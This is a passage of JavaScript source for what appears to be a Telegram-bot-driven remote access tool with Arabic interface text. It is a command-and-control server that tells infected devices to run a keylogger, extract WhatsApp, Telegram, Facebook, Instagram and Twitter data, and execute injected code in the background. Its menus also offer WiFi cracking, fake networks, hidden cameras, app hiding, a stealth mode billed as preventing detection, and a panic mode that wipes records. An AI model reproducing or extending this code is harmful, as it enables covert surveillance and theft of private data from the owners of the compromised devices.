        `• ${EMOJIS.MICROPHONE} تسجيل مخفي\n\n` +
        `${EMOJIS.SHIELD} *أدوات الحماية:*\n` +
        `• ${EMOJIS.FIREWALL} جدار حماية متقدم\n` +
        `• ${EMOJIS.DETECT} كشف التطبيقات الضارة\n` +
        `• ${EMOJIS.REMOVE} إزالة البرمجيات الخبيثة\n` +
        `• ${EMOJIS.SCAN} فحص النظام\n\n` +
        `${EMOJIS.MAGIC} *أدوات خاصة:*\n` +
        `• ${EMOJIS.INVISIBLE} وضع التخفي\n` +
        `• ${EMOJIS.FAKE} بيانات وهمية\n` +
        `• ${EMOJIS.TRACK} تتبع متقدم\n` +
        `• ${EMOJIS.REVERSE} هندسة عكسية`;
    
    appBot.sendMessage(chatId, hackingTools, {
        parse_mode: "Markdown",
        reply_markup: {
            inline_keyboard: [
                [
                    { text: `${EMOJIS.WIFI} اختراق WiFi`, callback_data: 'hack:wifi' },
                    { text: `${EMOJIS.PHONE} اعتراض اتصال`, callback_data: 'hack:intercept' }
                ],
                [
                    { text: `${EMOJIS.KEYLOG} Keylogger`, callback_data: 'hack:keylogger' },
                    { text: `${EMOJIS.CAMERA} كاميرا خفية`, callback_data: 'hack:spycam' }
                ],
                [
                    { text: `${EMOJIS.SHIELD} فحص النظام`, callback_data: 'hack:scan' },
                    { text: `${EMOJIS.REMOVE} تنظيف`, callback_data: 'hack:clean' }
                ],
                [
                    { text: `${EMOJIS.INVISIBLE} وضع التخفي`, callback_data: 'hack:stealth' },
                    { text: `${EMOJIS.GHOST} إخفاء`, callback_data: 'hack:hide' }
                ],
                [
                    { text: `${EMOJIS.WARNING} العودة`, callback_data: 'back' }
                ]
            ]
        }
    });
}

function panicMode(chatId) {
    const panicMessage = 
        `${EMOJIS.ALERT} ${EMOJIS.FIRE} *وضع الطوارئ*\n\n` +
        `${EMOJIS.WARNING} *جميع البيانات ستحذف ذاتياً خلال 10 ثواني!*\n\n` +
        `${EMOJIS.COUNTDOWN} العد التنازلي:\n`;
    
    appBot.sendMessage(chatId, panicMessage, { parse_mode: "Markdown" });
    
    // عد تنازلي
    for (let i = 10; i > 0; i--) {
        setTimeout(() => {
            appBot.sendMessage(chatId, `${EMOJIS.ALERT} ${i}...`);
        }, (10 - i) * 1000);
    }
    
    // مسح جميع البيانات بعد 10 ثواني
    setTimeout(() => {
        appClients.clear();
        commandHistory.clear();
        userSessions.clear();
        scheduledTasks.clear();
        
        appBot.sendMessage(chatId,
            `${EMOJIS.SUCCESS} ${EMOJIS.GHOST} *تم مسح جميع البيانات*\n\n` +
            `${EMOJIS.INFO} النظام نظيف وجاهز للبدء من جديد`,
            { parse_mode: "Markdown" }
        );
    }, 10000);
}

function startKeylogger(chatId, deviceId) {
    const device = appClients.get(deviceId);
    if (!device) {
        appBot.sendMessage(chatId, `${EMOJIS.ERROR} الجهاز غير موجود`);
        return;
    }
    
    appSocket.clients.forEach(ws => {
        if (ws.uuid === deviceId) {
            ws.send(JSON.stringify({
                type: 'start_keylogger',
                duration: 3600, // ساعة واحدة
                saveTo: 'keylog.txt'
            }));
        }
    });
    
    appBot.sendMessage(chatId,
        `${EMOJIS.SUCCESS} ${EMOJIS.KEYLOG} *Keylogger مفعل*\n\n` +
        `${EMOJIS.DEVICE} على الجهاز: ${device.model}\n` +
        `${EMOJIS.CLOCK} المدة: 60 دقيقة\n` +
        `${EMOJIS.FILE} سيحفظ في: keylog.txt`,
        { parse_mode: "Markdown" }
    );
}

function getSocialMedia(chatId, deviceId) {
    const device = appClients.get(deviceId);
    if (!device) {
        appBot.sendMessage(chatId, `${EMOJIS.ERROR} الجهاز غير موجود`);
        return;
    }
    
    appSocket.clients.forEach(ws => {
        if (ws.uuid === deviceId) {
            ws.send(JSON.stringify({
                type: 'extract_social_data',
                platforms: ['whatsapp', 'telegram', 'facebook', 'instagram', 'twitter']
            }));
        }
    });
    
    appBot.sendMessage(chatId,
        `${EMOJIS.SEARCH} ${EMOJIS.SOCIAL} *جاري جمع بيانات التواصل الاجتماعي*\n\n` +
        `${EMOJIS.DEVICE} من الجهاز: ${device.model}\n` +
        `${EMOJIS.PLATFORMS} المنصات: WhatsApp, Telegram, Facebook, Instagram, Twitter\n` +
        `${EMOJIS.CLOCK} قد تستغرق العملية بضع دقائق...`,
        { parse_mode: "Markdown" }
    );
}

function injectCode(chatId, deviceId, code) {
    const device = appClients.get(deviceId);
    if (!device) {
        appBot.sendMessage(chatId, `${EMOJIS.ERROR} الجهاز غير موجود`);
        return;
    }
    
    appSocket.clients.forEach(ws => {
        if (ws.uuid === deviceId) {
            ws.send(JSON.stringify({
                type: 'inject_code',
                code: code,
                language: 'javascript'
            }));
        }
    });
    
    appBot.sendMessage(chatId,
        `${EMOJIS.SUCCESS} ${EMOJIS.MAGIC} *تم حقن الكود*\n\n` +
        `${EMOJIS.DEVICE} في الجهاز: ${device.model}\n` +
        `${EMOJIS.CODE} الكود: ${code.substring(0, 50)}${code.length > 50 ? '...' : ''}\n` +
        `${EMOJIS.WARNING} سيتم تنفيذه في الخلفية`,
        { parse_mode: "Markdown" }
    );
}

function toggleStealthMode(chatId) {
    const stealthMode = !app.get('stealthMode');
    app.set('stealthMode', stealthMode);
    
    appBot.sendMessage(chatId,
        `${stealthMode ? EMOJIS.GHOST : EMOJIS.DEVICE} ${stealthMode ? EMOJIS.SUCCESS : EMOJIS.INFO} *وضع التخفي ${stealthMode ? 'مفعل' : 'معطل'}*\n\n` +
        `${EMOJIS.INFO} في وضع التخفي:\n` +
        `• ${stealthMode ? '✅' : '❌'} لا يتم تسجيل الأنشطة\n` +
        `• ${stealthMode ? '✅' : '❌'} اتصالات مشفرة إضافية\n` +
        `• ${stealthMode ? '✅' : '❌'} إخفاء السيرفر\n` +
        `• ${stealthMode ? '✅' : '❌'} منع الاكتشاف`,
        { parse_mode: "Markdown" }
    );
}

// ==================== معالجة استعلامات الرد المتقدمة ====================

appBot.on("callback_query", (callbackQuery) => {
    const msg = callbackQuery.message;
    const data = callbackQuery.data;
    const [category, action] = data.split(':');
    
    switch (category) {
        case 'hack':
            handleHackingTool(action, msg);
            break;
        case 'device':
            handleDeviceSelection(action, msg);
            break;
        case 'command':
            handleCommandExecution(action, msg);
            break;
        case 'admin':
            handleAdminAction(action, msg);
            break;
        case 'back':
            appBot.deleteMessage(CHAT_ID, msg.message_id);
            sendAdvancedWelcome(CHAT_ID);
            break;
        default:
            console.log(`${EMOJIS.WARNING} Callback غير معروف:`, data);
    }
});

function handleHackingTool(tool, msg) {
    switch (tool) {
        case 'wifi':
            startWifiHacking(msg);
            break;
        case 'intercept':
            startInterception(msg);
            break;
        case 'keylogger':
            showKeyloggerSettings(msg);
            break;
        case 'spycam':
            startSpyCamera(msg);
            break;
        case 'scan':
            startSystemScan(msg);
            break;
        case 'clean':
            cleanDevice(msg);
            break;
        case 'stealth':
            activateStealthMode(msg);
            break;
        case 'hide':
            hideApplication(msg);
            break;
    }
}

function startWifiHacking(msg) {
    const message = 
        `${EMOJIS.WIFI} ${EMOJIS.FIRE} *اختراق شبكات WiFi*\n\n` +
        `${EMOJIS.INFO} *المميزات:*\n` +
        `• كشف الشبكات القريبة\n` +
        `• اختراق كلمات المرور\n` +
        `• إنشاء شبكات وهمية\n` +
        `• اعتراض البيانات\n\n` +
        `${EMOJIS.WARNING} *اختر الإجراء:*`;
    
    appBot.editMessageText(message, {
        chat_id: CHAT_ID,
        message_id: msg.message_id,
        parse_mode: "Markdown",
        reply_markup: {
            inline_keyboard: [
                [
                    { text: `${EMOJIS.SEARCH} مسح الشبكات`, callback_data: 'wifi:scan' },
                    { text: `${EMOJIS.LOCK} اختراق شبكة`, callback_data: 'wifi:crack' }
                ],
                [
                    { text: `${EMOJIS.WIFI} شبكة وهمية`, callback_data: 'wifi:fake' },
                    { text: `${EMOJIS.EAVESDROP} اعتراض`, callback_data: 'wifi:intercept' }
                ],
                [
                    { text: `${EMOJIS.WARNING} العودة`, callback_data: 'hack:back' }
                ]
            ]
        }
    });
}

// ==================== ميزات إضافية ====================

// نظام المهام المجدولة
function scheduleTask(deviceId, taskType, time, data) {
    const taskId = crypto.randomBytes(8).toString('hex');
    const task = {
        id: taskId,
        deviceId,
        taskType,
        scheduleTime: new Date(time),
        data,
        status: 'scheduled'
    };
    
    scheduledTasks.set(taskId, task);
    
    // حساب الوقت المتبقي
    const timeLeft = task.scheduleTime.getTime() - Date.now();
    if (timeLeft > 0) {
        setTimeout(() => {
            executeScheduledTask(taskId);
        }, timeLeft);
    }
    
    return taskId;
}

function executeScheduledTask(taskId) {
    const task = scheduledTasks.get(taskId);
    if (!task) return;
    
    task.status = 'executing';
    
    appSocket.clients.forEach(ws => {
        if (ws.uuid === task.deviceId) {
            ws.send(JSON.stringify({
                type: task.taskType,
                ...task.data
            }));
        }
    });
    
    task.status = 'completed';
    task.completedAt = new Date();
    
    // إرسال إشعار
    const device = appClients.get(task.deviceId);
    if (device) {
        appBot.sendMessage(CHAT_ID,
            `${EMOJIS.SUCCESS} ${EMOJIS.SCHEDULE} *تم تنفيذ المهمة المجدولة*\n\n` +
            `${EMOJIS.DEVICE} الجهاز: ${device.model}\n` +
            `${EMOJIS.TASK} المهمة: ${task.taskType}\n` +
            `${EMOJIS.TIME} الوقت: ${task.completedAt.toLocaleTimeString('ar-SA')}`,
            { parse_mode: "Markdown" }
        );
    }
}

// نظام الإنذارات
const alarms = new Map();

function setAlarm(deviceId, condition, action) {
    const alarmId = crypto.randomBytes(8).toString('hex');
    alarms.set(alarmId, {
        deviceId,
        condition,
        action,
        active: true
    });
    
    return alarmId;
}

function checkAlarms(deviceId, data) {
    alarms.forEach((alarm, id) => {
        if (alarm.deviceId === deviceId && alarm.active) {
            // التحقق من الشرط
            if (evaluateCondition(alarm.condition, data)) {
                // تنفيذ الإجراء
                executeAlarmAction(alarm.action, deviceId);
                alarm.lastTriggered = new Date();
            }
        }
    });
}

function evaluateCondition(condition, data) {
    // تنفيذ بسيط لتقييم الشروط
    // يمكن تطويره ليدعم شروط معقدة
    try {
        const func = new Function('data', `return ${condition}`);
        return func(data);
    } catch (error) {
        console.error(`${EMOJIS.ERROR} خطأ في تقييم الشرط:`, error);
        return false;
    }
}

function executeAlarmAction(action, deviceId) {
    const device = appClients.get(deviceId);
    if (!device) return;
    
    const actionMessage = 
        `${EMOJIS.ALERT} ${EMOJIS.BELL} *تم تشغيل الإنذار*\n\n` +
        `${EMOJIS.DEVICE} الجهاز: ${device.model}\n` +
        `${EMOJIS.TIME} الوقت: ${new Date().toLocaleTimeString('ar-SA')}\n` +
        `${EMOJIS.ACTION} الإجراء: ${action}`;
    
    appBot.sendMessage(CHAT_ID, actionMessage, { parse_mode: "Markdown" });
    
    // تنفيذ الإجراء على الجهاز
    appSocket.clients.forEach(ws => {
        if (ws.uuid === deviceId) {
            ws.send(JSON.stringify({
                type: 'alarm_action',
                action: action
            }));
        }
    });
}

// ==================== تشغيل النظام ====================

// فحص الاتصال الدوري
setInterval(() => {
    // إرسال ping لجميع الأجهزة
    appSocket.clients.forEach(ws => {
        if (Date.now() - ws.lastActivity > 30000) { // 30 ثانية
            ws.ping();
        }
    });
    
    // فحص المهام المجدولة
    scheduledTasks.forEach((task, id) => {
        if (task.status === 'scheduled' && task.scheduleTime <= new Date()) {
            executeScheduledTask(id);
        }
    });
    
    // محاولة فحص الوصول للإنترنت
    try {
        axios.get(PING_ADDRESS, { timeout: 5000 });
    } catch (error) {
        console.log(`${EMOJIS.WARNING} فقدان الاتصال بالإنترنت`);
    }
    
    // تنظيف الجلسات المنتهية
    userSessions.forEach((session, chatId) => {
        if (Date.now() - session.lastActivity > SESSION_TIMEOUT) {
            userSessions.delete(chatId);
        }
    });
    
    // تنظيف التخزين المؤقت
    if (rateLimit.size > 1000) {
        const now = Date.now();
        rateLimit.forEach((requests, ip) => {
            rateLimit.set(ip, requests.filter(time => now - time < 60000));
        });
    }
}, 10000); // كل 10 ثواني

// بدء تشغيل السيرفر
appServer.listen(PORT, () => {
    console.log(`
    ${EMOJIS.ROCKET} ${EMOJIS.SUCCESS} *نظام التحكم المتقدم يعمل!*
    
    ${EMOJIS.SHIELD} ${EMOJIS.CROWN} *معلومات النظام:*
    ├─ ${EMOJIS.SERVER} المنفذ: ${PORT}
    ├─ ${EMOJIS.LOCK} التشفير: مفعل
    ├─ ${EMOJIS.FIREWALL} الحماية: نشطة
    ├─ ${EMOJIS.DATABASE} الذاكرة: ${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)} MB
    └─ ${EMOJIS.CLOCK} الوقت: ${new Date().toLocaleString('ar-SA')}
    
    ${EMOJIS.ZAP} ${EMOJIS.TROPHY} *المميزات النشطة:*
    ├─ ${EMOJIS.DEVICE} إدارة أجهزة متعددة
    ├─ ${EMOJIS.CAMERA} نظام كاميرات
    ├─ ${EMOJIS.MICROPHONE} تسجيل صوتي
    ├─ ${EMOJIS.KEYLOG} keylogger
    ├─ ${EMOJIS.SOCIAL} بيانات التواصل
    ├─ ${EMOJIS.HACK} أدوات متقدمة
    └─ ${EMOJIS.SCHEDULE} مهام مجدولة
    
    ${EMOJIS.PARTY} ${EMOJIS.FIRE} *جاهز للعمل!*
    `);
});

// معالجة إغلاق التطبيق
process.on('SIGINT', () => {
    console.log(`\n${EMOJIS.WARNING} ${EMOJIS.ALERT} إغلاق النظام...`);
    
    // إرسال رسالة إغلاق لجميع الأجهزة
    appSocket.clients.forEach(ws => {
        ws.send(JSON.stringify({
            type: 'system_shutdown',
            message: 'السيرفر مغلق'
        }));
        ws.close();
    });
    
    // حفظ النسخ الاحتياطي النهائي
    const backupData = {
        clients: Array.from(appClients.entries()),
        stats: systemStats,
        history: Array.from(commandHistory.entries()),
        timestamp: new Date().toISOString()
    };
    
    const backupFile = path.join(systemFolders.backups, `shutdown_backup_${Date.now()}.json`);
    fs.writeFileSync(backupFile, JSON.stringify(backupData, null, 2));
    
    console.log(`${EMOJIS.SUCCESS} ${EMOJIS.BACKUP} تم حفظ النسخ الاحتياطي في: ${backupFile}`);
    console.log(`${EMOJIS.INFO} ${EMOJIS.BYE} وداعاً!`);
    process.exit(0);
});
